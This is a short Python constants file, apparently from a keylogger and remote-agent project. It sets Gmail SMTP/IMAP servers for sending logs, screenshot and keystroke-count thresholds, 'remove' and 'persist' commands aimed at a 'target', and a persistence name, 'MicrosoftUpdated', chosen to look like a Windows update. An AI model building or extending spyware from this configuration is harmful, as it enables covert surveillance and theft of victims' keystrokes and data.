# Date: 01/28/2019
# Author: Mohamed
# Description: Constants 

from enum import Enum 


class GmailConst(Enum):

    LESS_SECURE_APPS = 'https://myaccount.google.com/lesssecureapps'
    SMTP_SERVER = 'smtp.gmail.com'
    IMAP_SERVER = 'imap.gmail.com'
    SMTP_PORT = 587


class ScreenConst(Enum):

    DIR = 'Screenshots'
    IMG = 'screenshot'
    EXTEN = '.png'


class AgentConst(Enum):
    
    MAX_WAIT_TIME = (5 * 60) # 5 * 60 => 5 minutes
    MAX_CHARS = 256 # max chars before sending log
    COMMAND_TIME = (2 * 60) # 2 * 60 => 2 minutes


class KeyloggerConst(Enum):

    MAX_CHARS = 128 # max chars before a screenshot


class Command(Enum):

    REMOVE = 'remove' # Remove the file from the target
    PERSIST = 'persist'


class Persist(Enum):

    NAME = 'MicrosoftUpdated' 